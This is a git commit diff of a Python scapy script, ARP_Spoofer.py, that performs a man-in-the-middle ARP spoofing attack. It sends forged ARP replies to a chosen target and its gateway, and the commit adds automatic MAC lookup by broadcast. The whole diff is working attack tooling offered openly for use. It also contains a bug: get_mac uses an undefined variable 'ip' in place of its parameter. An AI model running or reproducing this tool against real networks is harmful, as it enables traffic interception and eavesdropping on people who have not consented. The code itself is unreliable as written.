94e33dd8a5758642c2f0195f0572a1ab29fb9fed
GenNiox <75768603+GenNiox@users.noreply.github.com>
2023-02-18 18:22:20 -0700

    Add files via upload

--- ARP_Spoofer/ARP_Spoofer.py
+++ ARP_Spoofer/ARP_Spoofer.py
@@ -9,21 +9,22 @@ def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i", "--interface", dest="mitm_interface", help="Attacker's interface to execute Man-in-the-Middle (MITM) attack (i.e. eth0)")
     parser.add_argument("-t", "--target", dest="target_ip", help="Target's IP address (i.e. 10.1.1.15)")
-    parser.add_argument("-tm", "--target-mac-address", dest="target_mac", help="Target's MAC Address (i.e. aa:bb:cc:dd:ee:ff)")
     parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address of Target (i.e. 10.1.1.1)")
-    # parser.add_argument("-gm", "--gateway-mac-address", dest="gateway_mac", help="Gateway's MAC Address (i.e. ff:ee:dd:cc:bb:aa)")
     options = parser.parse_args()
     if not options.mitm_interface:
         parser.error("[-] Please specify an interface to execute the attack from, see --help for more info.")
     if not options.target_ip:
         parser.error("[-] Please specify a target IP address, see --help for more info.")
-    if not options.target_mac:
-        parser.error("[-] Please specify a target MAC Address, see --help for more info.")
     if not options.gateway_ip:
         parser.error("[-] Please specify a gateway IP address, see --help for more info.")
-    # if not options.gateway_mac:
-    #     parser.error("[-] Please specify a gateway MAC Address, see --help for more info.")
     return options
+
+def get_mac(ip_address):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
 
 def mitm_mac(mitm_interface):
     parse_mac = argparse.ArgumentParser()
@@ -32,14 +33,11 @@ def mitm_mac(mitm_interface):
     return mitm_mac_address
 
 
-def arp_spoof_target(target_ip, target_mac, gateway_ip):
-    packet = scapy.ARP(op=2, pdst=str(target_ip), hwdst=(target_mac), psrc=(gateway_ip))
+def arp_spoof_target(target_ip, gateway_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=str(target_ip), hwdst=target_mac, psrc=gateway_ip)
     scapy.send(packet)
 
-
-def arp_spoof_gateway(target_ip, gateway_mac, gateway_ip):
-    packet = scapy.ARP(op=2, pdst=str(gateway_ip), hwdst=(gateway_mac), psrc=(target_ip))
-    scapy.send(packet)
 
 # target_ip = input("Target IP Address: ")
 # target_mac = input("Target MAC Address: ")
@@ -50,11 +48,12 @@ def arp_spoof_gateway(target_ip, gateway_mac, gateway_ip):
 options = get_arguments()
 print("[ ] Script Started.")
 print("[+] Querying for MAC Address..")
+target_mac = get_mac(options.target_ip)
 mitm_mac_address = mitm_mac(options.mitm_interface)
 print("[+] Spoofing Target..")
-arp_spoof_target(options.target_ip, options.target_mac, options.gateway_ip)
+arp_spoof_target(options.target_ip, options.gateway_ip)
 print("[+] Spoofed Target!")
 print("[+] Spoofing Gateway..")
-arp_spoof_gateway(options.target_ip, options.target_mac, options.gateway_ip)
+arp_spoof_target(options.gateway_ip, options.target_ip)
 print("[+] Spoofed Gateway!")
 print("[X] Script completed!")
